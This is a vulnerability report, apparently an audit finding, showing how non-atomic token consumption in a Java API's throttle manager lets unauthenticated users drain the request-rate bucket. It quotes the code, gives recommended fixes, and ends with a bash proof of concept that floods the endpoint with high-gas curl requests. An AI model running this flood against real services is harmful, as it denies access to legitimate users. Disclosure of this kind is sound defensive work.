### Title
Non-Atomic Rate Limit Token Consumption Enables Rate Limit Exhaustion Without Computation

### Summary
In `ThrottleManagerImpl.throttle()`, the `rateLimitBucket.tryConsume(1)` and `gasLimitBucket.tryConsume(scaleGas(gas))` checks are executed sequentially and non-atomically. When the first check succeeds but the second fails, a `rateLimitBucket` token is permanently consumed with no computation performed and no restore path. An unprivileged attacker can exploit this to drain the `rateLimitBucket` for all users, causing denial of service.

### Finding Description

**Exact code path:**

`ThrottleManagerImpl.java`, lines 37–42:
```java
if (!rateLimitBucket.tryConsume(1)) {
    throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
} else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
    throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
}
```

**Root cause:** The two `tryConsume` calls are not atomic. If `rateLimitBucket.tryConsume(1)` succeeds and `gasLimitBucket.tryConsume(...)` fails, the rate limit token is consumed and a `ThrottleException` is thrown. There is no code path that restores the `rateLimitBucket` token in this case.

**Why the existing restore() is insufficient:**

`ContractController.java`, lines 46–49:
```java
} catch (InvalidParametersException e) {
    throttleManager.restore(request.getGas());
    throw e;
}
```

`restore()` is only triggered by `InvalidParametersException`. `ThrottleException` (thrown when `gasLimitBucket` fails) is not caught here, so no restore occurs. Furthermore, `restore()` itself only adds tokens back to `gasLimitBucket`, never to `rateLimitBucket`:

`ThrottleManagerImpl.java`, lines 59–64:
```java
public void restore(long gas) {
    long tokens = throttleProperties.scaleGas(gas);
    if (tokens > 0) {
        gasLimitBucket.addTokens(tokens);  // rateLimitBucket is never restored
    }
}
```

**Exploit flow:**

1. Attacker sends requests with maximum gas (e.g., `gas = 15,000,000`). `scaleGas(15_000_000) = 1,500` tokens per request. With default `gasPerSecond = 7,500,000,000` → scaled capacity = `750,000` tokens. It takes `750,000 / 1,500 = 500` requests to exhaust `gasLimitBucket`. Default `requestsPerSecond = 500`, so this exactly exhausts both buckets in one second.

2. After `gasLimitBucket` is exhausted, the attacker (or any user) sends additional requests. Each request: passes `rateLimitBucket.tryConsume(1)` (consuming 1 token), fails `gasLimitBucket.tryConsume(...)`, throws `ThrottleException`. No computation is performed. The `rateLimitBucket` token is permanently lost.

3. Legitimate users now receive `REQUEST_PER_SECOND_LIMIT_EXCEEDED` errors even though no actual historical simulation was performed on their behalf.

4. The attack is repeatable every second as both buckets use `refillGreedy` with a 1-second window.

### Impact Explanation

Legitimate users are denied access to the `/api/v1/contracts/call` endpoint. The `rateLimitBucket` (default 500 req/s) is drained by requests that perform zero computation, meaning the rate limit no longer accurately represents actual server load. The attacker can sustain this indefinitely with no special privileges, no authentication, and no elevated access — only the ability to send HTTP POST requests.

### Likelihood Explanation

Any unprivileged external user can trigger this. No credentials, API keys, or special network position are required. The attack requires only a sustained stream of HTTP requests with high `gas` values, which is trivially scriptable. The 1-second refill window means the attack must be maintained continuously, but this is easily automated. The attack is fully repeatable and requires no prior knowledge of the system beyond the public API contract.

### Recommendation

1. **Restore `rateLimitBucket` on `gasLimitBucket` failure.** Add a `rateLimitBucket.addTokens(1)` call inside the `gasLimitBucket` failure branch in `ThrottleManagerImpl.throttle()`, or expose a `restoreRateLimit()` method on `ThrottleManager` and call it from `ContractController` when a `ThrottleException` caused by gas limit failure is caught.

2. **Alternatively, check both buckets before consuming either.** Use `rateLimitBucket.getAvailableTokens() >= 1 && gasLimitBucket.getAvailableTokens() >= scaleGas(gas)` as a pre-check, then consume atomically — or use Bucket4j's `tryConsumeAndReturnRemaining` to probe without consuming, then consume only if both pass.

3. **Extend `restore()` to also restore `rateLimitBucket` tokens** when a gas-limit throttle failure occurs, and catch `ThrottleException` in `ContractController` to invoke it.

### Proof of Concept

```bash
# Step 1: Exhaust gasLimitBucket with 500 high-gas requests
for i in $(seq 1 500); do
  curl -s -X POST http://<host>/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d '{"to":"0x0000000000000000000000000000000000000001","gas":15000000}' &
done
wait

# Step 2: gasLimitBucket is now exhausted.
# Each subsequent request consumes 1 rateLimitBucket token and fails on gasLimitBucket.
# Repeat to drain rateLimitBucket, blocking all legitimate users.
for i in $(seq 1 500); do
  curl -s -X POST http://<host>/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d '{"to":"0x0000000000000000000000000000000000000001","gas":15000000}' &
done
wait

# Legitimate users now receive:
# {"message":"Requests per second rate limit exceeded"}
# even though no simulation was performed for them.
```